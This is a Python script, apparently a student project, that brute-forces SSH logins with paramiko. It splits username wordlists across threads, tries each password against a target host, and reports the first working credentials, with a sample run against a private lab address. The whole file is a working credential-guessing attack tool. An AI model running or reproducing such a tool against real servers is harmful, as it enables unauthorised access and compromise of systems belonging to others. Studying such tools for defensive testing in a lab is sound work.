#! -*- coding:utf-8 -*-

import threading
import paramiko
result={}
count=0
flag=False
lock = threading.Lock()
def test(username,password,ip,port):
    global flag
    global count
    # port=int(port)
    for user in username:
        for passwd in password:

            if flag==True:
                return
            lock.acquire()
            count+=1
            lock.release()
            try:

                lock.acquire()
                print('\n 正在尝试：用户名：%s 密码：%s\n' % (user, passwd))
                lock.release()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port, user, passwd)
                lock.acquire()
                flag=True
                result['usernmae']=user
                result['password'] = passwd
                result['count'] = count
                lock.release()
                print('\n[+] 破解成功，用户名：%s 密码：%s\n' % (user, passwd))
                return
            except:

                pass


def brute(thread_num,ip,port):
    with open(r'C:\Users\dkl\Desktop\bishe\uuuu.txt', 'r') as f:
        temp = f.readlines()
    username = [str.rstrip() for str in temp]
    with open(r'C:\Users\dkl\Desktop\bishe\pppp.txt', 'r') as f:
        temp = f.readlines()
    password = [str.rstrip() for str in temp]
    name=[]
    if thread_num>0 and thread_num<len(username):
        times = int(len(username) / thread_num)
        for i in range(thread_num):
            t1 = threading.Thread(target=test, args=(username[i*times:(i + 1) * times], password,ip,port))
            t1.start()
            name.append(t1)
        for i in range(thread_num):
            name[i].join()
        if username[thread_num * times:]:
            test(username[thread_num * times:], password,ip,port)
        if 'count' not in result:
            result['count']=count
    else:
        test(username,password,ip,port)
        if 'count' not in result:
            result['count']=count

if __name__ == '__main__':
    test(['root','user'], ['134','12345678'], '192.168.80.130', '22')
    print(result)









